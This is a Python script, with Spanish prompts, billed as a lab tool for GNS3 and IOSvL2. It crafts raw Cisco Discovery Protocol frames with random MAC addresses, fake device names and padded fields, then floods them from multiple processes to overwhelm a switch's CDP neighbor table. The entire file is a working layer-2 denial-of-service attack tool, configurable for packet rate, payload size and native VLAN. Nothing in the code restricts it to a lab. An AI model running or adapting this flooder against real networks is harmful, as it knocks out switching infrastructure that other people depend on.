```python
#!/usr/bin/env python3
import argparse
import os
import random
import signal
import socket
import struct
import subprocess
import sys
import time
from multiprocessing import Process, Event

def checksum(data):
    if len(data) % 2:
        data += b"\x00"

    total = 0

    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xffff) + (total >> 16)

    return (~total) & 0xffff

def tlv(kind, value):
    return struct.pack("!HH", kind, len(value) + 4) + value

def get_iface_mac(iface):
    path = f"/sys/class/net/{iface}/address"

    if not os.path.exists(path):
        return "00:00:00:00:00:00"

    return open(path, "r").read().strip()

def iface_mac_bytes(iface):
    raw = get_iface_mac(iface)
    return bytes(int(x, 16) for x in raw.split(":"))

def random_mac():
    return bytes([
        0x02,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    ])

def get_ip_line(iface):
    try:
        out = subprocess.check_output(
            ["ip", "-br", "addr", "show", iface],
            text=True
        ).strip()
        return out
    except Exception:
        return iface

def list_interfaces():
    interfaces = []

    for iface in sorted(os.listdir("/sys/class/net")):
        if iface == "lo":
            continue

        if os.path.exists(f"/sys/class/net/{iface}"):
            interfaces.append(iface)

    return interfaces

def choose_interface(default_iface="eth0"):
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red.")
        sys.exit(1)

    print("")
    print("Interfaces disponibles:")
    print("")

    for idx, iface in enumerate(interfaces, 1):
        print(f"{idx}. {get_ip_line(iface)}")

    print("")

    if default_iface not in interfaces:
        default_iface = interfaces[0]

    choice = input(f"Selecciona la interfaz conectada al switch [Enter = {default_iface}]: ").strip()

    if choice == "":
        return default_iface

    if choice.isdigit():
        pos = int(choice)

        if 1 <= pos <= len(interfaces):
            return interfaces[pos - 1]

    if choice in interfaces:
        return choice

    print(f"Interfaz inválida: {choice}")
    sys.exit(1)

def ask_vlan():
    value = input("VLAN nativa a anunciar en CDP [Enter = ninguna]: ").strip()

    if value == "":
        return None

    if not value.isdigit():
        print(f"VLAN inválida: {value}")
        sys.exit(1)

    vlan = int(value)

    if vlan < 1 or vlan > 4094:
        print("La VLAN debe estar entre 1 y 4094")
        sys.exit(1)

    return vlan

def address_tlv(ip):
    return (
        struct.pack("!I", 1)
        + b"\x01"
        + b"\x01"
        + b"\xcc"
        + struct.pack("!H", 4)
        + socket.inet_aton(ip)
    )

def build_cdp(seq, args, worker):
    fake_ip = f"10.{worker % 250}.{(seq // 250) % 250}.{seq % 250}"

    device = f"{args.prefix}-{worker}-{seq}-{random.randint(10000, 99999)}".encode()
    port = f"GigabitEthernet{random.randint(0, 9)}/{random.randint(0, 9)}/{random.randint(1, 48)}".encode()
    platform = f"cisco IOSvL2 LAB {worker}-{seq}".encode()
    duplex = b"\x01"
    capabilities = struct.pack("!I", args.capabilities)

    body = b""
    body += tlv(0x0001, device)
    body += tlv(0x0002, address_tlv(fake_ip))
    body += tlv(0x0003, port)
    body += tlv(0x0004, capabilities)
    body += tlv(0x0006, platform)

    if args.vlan is not None:
        native_vlan = struct.pack("!H", args.vlan)
        body += tlv(0x000a, native_vlan)

    body += tlv(0x000b, duplex)

    max_body_len = args.payload_size - 8 - 4
    software_base = f"Cisco IOS Software CDP stress lab worker {worker} seq {seq} ".encode()
    available = max_body_len - len(body) - 4 - len(software_base)

    if available > 0:
        pad_len = min(args.extra, available)
        software = software_base + (b"X" * pad_len)
        body += tlv(0x0005, software)

    header = struct.pack("!BBH", 2, args.ttl, 0)
    packet = header + body
    csum = checksum(packet)

    return struct.pack("!BBH", 2, args.ttl, csum) + body

def build_frame(src, cdp):
    dst = bytes.fromhex("01000ccccccc")
    llc_snap = b"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
    payload = llc_snap + cdp
    length = struct.pack("!H", len(payload))

    return dst + src + length + payload

def sender(args, worker, limit, stop_event):
    src_real = iface_mac_bytes(args.iface)

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((args.iface, 0))
    except PermissionError:
        print("Ejecuta el script con sudo.")
        stop_event.set()
        return
    except OSError as e:
        print(f"Error usando la interfaz {args.iface}: {e}")
        stop_event.set()
        return

    print(f"worker {worker} preparando pool={args.pool}")

    pool = []

    for n in range(args.pool):
        seq = n + worker * args.pool
        src = random_mac() if args.random_src else src_real
        cdp = build_cdp(seq, args, worker)
        frame = build_frame(src, cdp)
        pool.append(frame)

    print(f"worker {worker} iniciando envio")

    sent = 0
    start = time.time()
    last = start
    end_time = start + args.duration if args.duration > 0 else 0

    delay = 0

    if args.pps > 0:
        delay = args.workers / args.pps

    while not stop_event.is_set():
        if end_time and time.time() >= end_time:
            break

        for frame in pool:
            if stop_event.is_set():
                break

            if end_time and time.time() >= end_time:
                break

            try:
                sock.send(frame)
            except OSError as e:
                if sent == 0:
                    print(f"worker {worker} send error: {e}")
                    time.sleep(1)
                continue

            sent += 1

            if limit > 0 and sent >= limit:
                now = time.time()
                rate = sent / max(now - start, 0.001)
                print(f"worker {worker} final packets={sent} avg_pps={rate:.0f}")
                return

            if delay > 0:
                time.sleep(delay)

        now = time.time()

        if now - last >= args.stats_interval:
            rate = sent / max(now - start, 0.001)
            print(f"worker {worker} packets={sent} avg_pps={rate:.0f}")
            last = now

    now = time.time()
    rate = sent / max(now - start, 0.001)
    print(f"worker {worker} stopped packets={sent} avg_pps={rate:.0f}")

def parse_int(value):
    return int(value, 0)

def main():
    parser = argparse.ArgumentParser(
        description="CDP DoS lab script para entornos controlados GNS3 e IOSvL2"
    )

    parser.add_argument("-i", "--iface", default=None)
    parser.add_argument("--pps", type=int, default=0)
    parser.add_argument("--count", type=int, default=0)
    parser.add_argument("--duration", type=int, default=0)
    parser.add_argument("--ttl", type=int, default=255)
    parser.add_argument("--prefix", default=None)
    parser.add_argument("--extra", type=int, default=1450)
    parser.add_argument("--pool", type=int, default=200000)
    parser.add_argument("--workers", type=int, default=0)
    parser.add_argument("--vlan", type=int, default=None)
    parser.add_argument("--payload-size", type=int, default=1500)
    parser.add_argument("--capabilities", type=parse_int, default=0x00000029)
    parser.add_argument("--stats-interval", type=int, default=1)
    parser.add_argument("--random-src", action="store_true")
    parser.add_argument("--yes", action="store_true")

    args = parser.parse_args()

    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta con sudo.")
        sys.exit(1)

    if args.iface is None:
        args.iface = choose_interface("eth0")

    if args.prefix is None:
        args.prefix = f"CDP-DOS-MICHAEL-{int(time.time())}"

    if args.vlan is None and not args.yes:
        args.vlan = ask_vlan()

    cpu_count = os.cpu_count() or 1

    if args.workers == 0:
        args.workers = cpu_count

    if args.workers < 1:
        args.workers = 1

    if args.workers > cpu_count:
        print(f"Workers solicitados={args.workers}")
        print(f"Workers usados={cpu_count}")
        args.workers = cpu_count

    if args.payload_size < 300:
        args.payload_size = 300

    if args.payload_size > 1500:
        args.payload_size = 1500

    if args.extra < 0:
        args.extra = 0

    if args.pool < 1:
        args.pool = 1

    if args.ttl < 1:
        args.ttl = 1

    if args.ttl > 255:
        args.ttl = 255

    if args.vlan is not None:
        if args.vlan < 1 or args.vlan > 4094:
            print("La VLAN debe estar entre 1 y 4094")
            sys.exit(1)

    if args.stats_interval < 1:
        args.stats_interval = 1

    print("")
    print("Configuracion del laboratorio CDP DoS:")
    print(f"iface={args.iface}")
    print(f"mac={get_iface_mac(args.iface)}")
    print(f"workers={args.workers}")
    print(f"pps={args.pps}")
    print(f"pool={args.pool}")
    print(f"extra={args.extra}")
    print(f"payload_size={args.payload_size}")
    print(f"ttl={args.ttl}")
    print(f"vlan={args.vlan if args.vlan is not None else 'sin TLV Native VLAN'}")
    print(f"duration={args.duration}")
    print(f"count={args.count}")
    print(f"prefix={args.prefix}")
    print(f"random_src={args.random_src}")
    print("")

    if not args.yes:
        confirm = input("Presiona Enter para iniciar o escribe n para cancelar: ").strip().lower()

        if confirm in ["n", "no", "cancel", "cancelar"]:
            print("Cancelado")
            sys.exit(0)

    stop_event = Event()
    processes = []

    if args.count > 0:
        base = args.count // args.workers
        rest = args.count % args.workers
    else:
        base = 0
        rest = 0

    def stop_handler(sig, frame):
        stop_event.set()

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    print("")
    print("Ataque iniciado. Usa Ctrl+C para detener.")
    print("")

    for worker in range(args.workers):
        limit = 0

        if args.count > 0:
            limit = base + (1 if worker < rest else 0)

        p = Process(target=sender, args=(args, worker, limit, stop_event))
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        stop_event.set()

        for p in processes:
            p.terminate()

    for p in processes:
        if p.is_alive():
            p.terminate()

    print("")
    print("Finalizado")

if __name__ == "__main__":
    main()
```
